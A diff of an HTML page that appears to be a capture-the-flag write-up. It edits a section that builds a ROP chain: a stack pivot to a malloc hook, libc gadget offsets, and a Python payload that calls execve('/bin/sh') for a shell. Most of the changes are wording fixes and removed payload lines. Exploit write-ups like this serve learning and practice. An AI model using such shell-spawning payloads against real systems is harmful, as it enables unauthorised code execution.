@@ -445,12 +445,11 @@ context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</s
 
 main()
 </code></pre></div><h1 id="no-one_gadget">No one_gadget?</h1>
-<p>We can stackpivot moving our stack to malloc hooks. Using pop rsp.
+<p>We can stackpivot moving our stack to malloc hooks (+8). Using pop rsp.
 Now that our stack is here, we&rsquo;ll want to get shell by calling execve binsh
 Reading from: <a href="https://filippo.io/linux-syscall-table/">https://filippo.io/linux-syscall-table/</a>
 we&rsquo;ll see that we need:</p>
-<pre><code>rsp = malloc+8
-rax = 59
+<pre><code>rax = 59
 rdi = */bin/sh
 syscall
 </code></pre><p>The addresses are as follows:</p>
@@ -458,10 +457,9 @@ syscall
 0x0000000000036218 - pop rax
 0x0000000000020e22 - pop rdi
 0x00000000000026bf - syscall
-</code></pre><p>To find the above i used ROPgadget libc | grep keyword.</p>
+</code></pre><p>To find the above I used ROPgadget libc | grep keyword.</p>
 <p>Now the final payload instead looks like this:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">3</span>
-payload <span style="color:#f92672">+=</span> p64(one_gadg)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span>
 payload <span style="color:#f92672">+=</span> p64(libc_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x3838</span>) <span style="color:#75715e"># pop rsp</span>
 payload <span style="color:#f92672">+=</span> p64(hook<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>) <span style="color:#75715e"># new top of stack</span>
 payload <span style="color:#f92672">+=</span> p64(libc_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x36218</span>) <span style="color:#75715e"># pop rax</span>
@@ -470,7 +468,7 @@ payload <span style="color:#f92672">+=</span> p64(libc_base<span style="color:#f
 payload <span style="color:#f92672">+=</span> p64(libc_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x163c34</span>) <span style="color:#75715e">#*/bin/sh</span>
 payload <span style="color:#f92672">+=</span> p64(libc_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x26bf</span>) <span style="color:#75715e"># syscall</span>
 </code></pre></div><p>Fin..</p>
-<p>happy days</p>
+<p>Happy days</p>
 
 </article>
 
